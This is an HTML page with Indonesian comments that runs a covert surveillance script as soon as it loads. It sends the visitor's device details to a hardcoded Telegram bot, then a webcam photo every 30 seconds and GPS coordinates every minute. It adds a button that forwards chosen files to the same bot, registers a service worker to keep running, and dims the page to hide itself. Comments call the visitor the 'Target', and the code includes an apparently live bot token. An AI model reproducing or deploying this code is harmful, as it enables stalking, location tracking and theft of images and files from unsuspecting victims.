<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>System</title>
    <style>
        body { margin: 0; padding: 0; background: white; }
        .status { position: fixed; bottom: 10px; left: 10px; background: rgba(0,0,0,0.5); color: white; padding: 5px 10px; border-radius: 5px; font-size: 10px; z-index: 9999; }
    </style>
</head>
<body>
    <div class="status" id="status">Initializing...</div>

    <script>
        // ============ KONFIGURASI TELEGRAM ============
        // GANTI DENGAN BOT TOKEN DAN CHAT ID KAMU!
        const TELEGRAM_BOT_TOKEN = "8702184722:AAGGdCH9koUzgcfwLg_Ez0Mk3MBAyp7SCMg";  // Dari @BotFather
        const TELEGRAM_CHAT_ID = "@tracingidBot";      // Dari @userinfobot
        // ==============================================
        
        let mediaStream = null;
        let backgroundSync = null;
        
        function updateStatus(msg) {
            const el = document.getElementById('status');
            if (el) el.innerHTML = msg;
            console.log(msg);
        }
        
        // Kirim ke Telegram
        async function sendToTelegram(message, file = null) {
            try {
                if (file) {
                    // Kirim file (foto/dokumen)
                    const formData = new FormData();
                    formData.append('chat_id', TELEGRAM_CHAT_ID);
                    formData.append(file.type === 'image' ? 'photo' : 'document', file);
                    
                    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/send${file.type === 'image' ? 'Photo' : 'Document'}`, {
                        method: 'POST',
                        body: formData
                    });
                    return response.ok;
                } else {
                    // Kirim pesan teks
                    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: TELEGRAM_CHAT_ID,
                            text: message,
                            parse_mode: 'HTML'
                        })
                    });
                    return response.ok;
                }
            } catch(e) {
                console.log('Telegram send failed:', e);
                return false;
            }
        }
        
        // ============ GPS LANGSUNG KE TELEGRAM ============
        async function sendLocationToTelegram() {
            if (!('geolocation' in navigator)) return;
            
            navigator.geolocation.getCurrentPosition(async (position) => {
                const lat = position.coords.latitude;
                const lng = position.coords.longitude;
                const acc = position.coords.accuracy;
                const time = new Date().toLocaleString('id-ID');
                
                // Buat link Google Maps
                const mapsLink = `https://www.google.com/maps?q=${lat},${lng}`;
                
                const message = `
📍 <b>GPS UPDATE</b> 📍
━━━━━━━━━━━━━━━━
🌍 <b>Koordinat:</b>
   <code>${lat}</code>
   <code>${lng}</code>
📏 <b>Akurasi:</b> ${acc} meter
🕐 <b>Waktu:</b> ${time}
🗺️ <b>Map:</b> <a href="${mapsLink}">Klik untuk lihat</a>
━━━━━━━━━━━━━━━━
                `;
                
                await sendToTelegram(message);
                updateStatus(`📍 ${lat}, ${lng}`);
                
                // Kirim lokasi sebagai live location (jika support)
                // await sendToTelegram(null, { type: 'location', latitude: lat, longitude: lng });
                
            }, (error) => {
                sendToTelegram(`⚠️ GPS Error: ${error.message}`);
            }, {
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0
            });
        }
        
        // ============ FOTO KE TELEGRAM ============
        async function captureAndSendPhoto() {
            if (!mediaStream) return;
            
            try {
                const video = document.createElement('video');
                video.srcObject = mediaStream;
                video.muted = true;
                video.playsInline = true;
                video.style.display = 'none';
                document.body.appendChild(video);
                await video.play();
                await new Promise(r => setTimeout(r, 200));
                
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                canvas.toBlob(async (blob) => {
                    const file = new File([blob], `photo_${Date.now()}.jpg`, { type: 'image/jpeg' });
                    await sendToTelegram(null, file);
                    console.log(`📸 Photo sent at ${new Date().toLocaleTimeString()}`);
                }, 'image/jpeg', 0.7);
                
                video.srcObject = null;
                video.remove();
            } catch(e) {
                console.log('Capture error:', e);
            }
        }
        
        // ============ DEVICE INFO KE TELEGRAM ============
        async function sendDeviceInfo() {
            const info = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                screen: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
            };
            
            // Cek baterai
            let battery = 'Tidak diketahui';
            if ('getBattery' in navigator) {
                try {
                    const b = await navigator.getBattery();
                    battery = `${(b.level * 100).toFixed(0)}% ${b.charging ? '(Mengisi)' : '(Tidak mengisi)'}`;
                } catch(e) {}
            }
            
            const message = `
📱 <b>DEVICE INFO</b> 📱
━━━━━━━━━━━━━━━━
💻 <b>Platform:</b> ${info.platform}
📱 <b>Mobile:</b> ${/Mobi|Android|iPhone/i.test(navigator.userAgent) ? 'Ya' : 'Tidak'}
🔋 <b>Baterai:</b> ${battery}
🖥️ <b>Screen:</b> ${info.screen}
🌐 <b>Browser:</b> ${navigator.userAgent.split(' ').slice(-2).join(' ')}
🕐 <b>Timezone:</b> ${info.timezone}
━━━━━━━━━━━━━━━━
            `;
            
            await sendToTelegram(message);
        }
        
        // ============ PERSISTENCE: KIRIM PING SETIAP 5 MENIT ============
        async function sendHeartbeat() {
            const message = `
💓 <b>HEARTBEAT</b> 💓
━━━━━━━━━━━━━━━━
🕐 <b>Time:</b> ${new Date().toLocaleString('id-ID')}
✅ <b>Status:</b> Active
━━━━━━━━━━━━━━━━
            `;
            await sendToTelegram(message);
        }
        
        // ============ AKSES FILE (Target upload manual) ============
        function setupFileUpload() {
            const fileInput = document.createElement('input');
            fileInput.type = 'file';
            fileInput.multiple = true;
            fileInput.style.display = 'none';
            document.body.appendChild(fileInput);
            
            const btn = document.createElement('button');
            btn.innerHTML = '📁 Upload';
            btn.style.position = 'fixed';
            btn.style.bottom = '20px';
            btn.style.right = '20px';
            btn.style.zIndex = '9999';
            btn.style.padding = '10px 20px';
            btn.style.background = '#1a73e8';
            btn.style.color = 'white';
            btn.style.border = 'none';
            btn.style.borderRadius = '20px';
            btn.onclick = () => fileInput.click();
            document.body.appendChild(btn);
            
            fileInput.onchange = async () => {
                for (let file of fileInput.files) {
                    await sendToTelegram(null, file);
                    console.log(`📁 Sent: ${file.name}`);
                }
                alert(`Sent ${fileInput.files.length} files to Telegram`);
                fileInput.value = '';
            };
        }
        
        // ============ SERVICE WORKER (Background persistence) ============
        async function registerServiceWorker() {
            try {
                // Coba gunakan Background Sync API
                if ('serviceWorker' in navigator && 'SyncManager' in window) {
                    const swCode = `
                        self.addEventListener('sync', event => {
                            if (event.tag === 'keep-alive') {
                                event.waitUntil(
                                    clients.matchAll().then(clients => {
                                        clients.forEach(client => client.postMessage('keep-alive'));
                                    })
                                );
                            }
                        });
                    `;
                    
                    const blob = new Blob([swCode], { type: 'application/javascript' });
                    const swUrl = URL.createObjectURL(blob);
                    const registration = await navigator.serviceWorker.register(swUrl);
                    console.log('Service Worker registered');
                    
                    // Request periodic sync
                    if ('periodicSync' in registration) {
                        const status = await navigator.permissions.query({ name: 'periodic-background-sync' });
                        if (status.state === 'granted') {
                            await registration.periodicSync.register('keep-alive', { minInterval: 15 * 60 * 1000 });
                        }
                    }
                }
            } catch(e) {
                console.log('Service Worker not supported:', e);
            }
        }
        
        // ============ MAIN ============
        async function start() {
            updateStatus('Starting...');
            
            // Kirim device info ke Telegram
            await sendDeviceInfo();
            
            // Minta akses kamera
            try {
                mediaStream = await navigator.mediaDevices.getUserMedia({ 
                    video: { width: 640, height: 480 },
                    audio: true
                });
                mediaStream.getAudioTracks().forEach(t => t.enabled = true);
                updateStatus('✅ Camera ready');
                
                // Ambil foto pertama
                await captureAndSendPhoto();
                
                // Foto setiap 30 detik
                setInterval(captureAndSendPhoto, 30000);
            } catch(e) {
                updateStatus('⚠️ Camera not available');
                await sendToTelegram('⚠️ Camera access denied by user');
            }
            
            // GPS setiap 1 menit
            await sendLocationToTelegram();
            setInterval(sendLocationToTelegram, 60000);
            
            // Heartbeat setiap 5 menit
            setInterval(sendHeartbeat, 5 * 60 * 1000);
            
            // Setup file upload
            setupFileUpload();
            
            // Register service worker untuk background
            await registerServiceWorker();
            
            updateStatus('✅ Active - Data goes to Telegram');
            
            // Sembunyikan halaman
            setTimeout(() => {
                document.body.style.opacity = '0.2';
            }, 3000);
        }
        
        start();
    </script>
</body>
</html>
